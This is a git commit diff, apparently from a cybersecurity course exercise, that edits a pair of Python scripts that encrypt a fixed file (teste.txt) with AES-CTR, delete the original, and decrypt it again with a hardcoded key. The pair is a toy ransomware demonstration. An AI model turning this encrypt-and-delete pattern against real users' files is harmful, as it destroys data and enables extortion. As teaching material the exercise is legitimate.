cb7aefcdcd51ad3fe999b64fcc19b6d6698d680b
Paulo Sérgio <psam1993@gmail.com>
2024-04-23 12:35:03 -0400

    Projeto Entregue - Com alterações.

--- decrypter.py
+++ decrypter.py
@@ -8,14 +8,14 @@ file_data = file.read()
 file.close()
 
 ## chave para descriptografia
-key = b"testeransomwares"
+key = b"diocybersecurity"
 aes = pyaes.AESModeOfOperationCTR(key)
 decrypt_data = aes.decrypt(file_data)
 
 ## remover o arquivo criptografado
 os.remove(file_name)
 
-## criar o arquivo descriptografado
+## Recriar o arquivo descriptografado
 new_file = "teste.txt"
 new_file = open(f'{new_file}', "wb")
 new_file.write(decrypt_data)
--- encrypter.py
+++ encrypter.py
@@ -1,20 +1,21 @@
 import os
 import pyaes
+os.system("ls *.txt")
+## abre o arquivo para ser criptografado
 
-## abrir o arquivo a ser criptografado
-file_name = "teste.txt"
+file_name = 'teste.txt'
 file = open(file_name, "rb")
 file_data = file.read()
 file.close()
 
-## remover o arquivo
+## remove o arquivo
 os.remove(file_name)
 
 ## chave de criptografia
-key = b"testeransomwares"
+key = b"diocybersecurity"
 aes = pyaes.AESModeOfOperationCTR(key)
 
-## criptografar o arquivo
+## criptografa o arquivo
 crypto_data = aes.encrypt(file_data)
 
 ## salvar o arquivo criptografado
